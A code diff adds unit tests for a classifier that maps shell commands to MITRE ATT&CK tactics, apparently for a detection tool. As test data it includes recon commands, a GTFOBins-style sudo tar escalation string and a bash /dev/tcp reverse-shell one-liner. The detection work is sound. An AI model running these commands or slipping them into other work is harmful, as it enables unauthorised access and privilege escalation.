@@ -47,4 +47,16 @@ describe("classifyCommand — context overrides (the few-shot cases)", () => {
     expect(r).toMatchObject({ tactic: "TA0002", technique: "T1059" });
     expect(r.confidence).toBeGreaterThan(0.8);
   });
+  it("sudo-prefixed recon is elevated recon, not privilege escalation", () => {
+    expect(classifyCommand("sudo nmap -sV 10.0.0.1").tactic).toBe("TA0007");
+    expect(classifyCommand("sudo gobuster dir -u http://x").tactic).toBe("TA0007");
+  });
+  it("sudo enumeration and gtfobin abuse stay Privilege Escalation", () => {
+    expect(classifyCommand("sudo -l").tactic).toBe("TA0004");
+    expect(classifyCommand("sudo tar -cf /dev/null /dev/null --checkpoint=1").tactic).toBe("TA0004");
+  });
+  it("ssh -i (identity file) is not a reverse shell, but real reverse shells still are", () => {
+    expect(classifyCommand("ssh -i /home/u/.ssh/id_ed25519 marcus@10.0.0.1").tactic).not.toBe("TA0002");
+    expect(classifyCommand("bash -i >& /dev/tcp/10.0.0.1/443 0>&1").tactic).toBe("TA0002");
+  });
 });
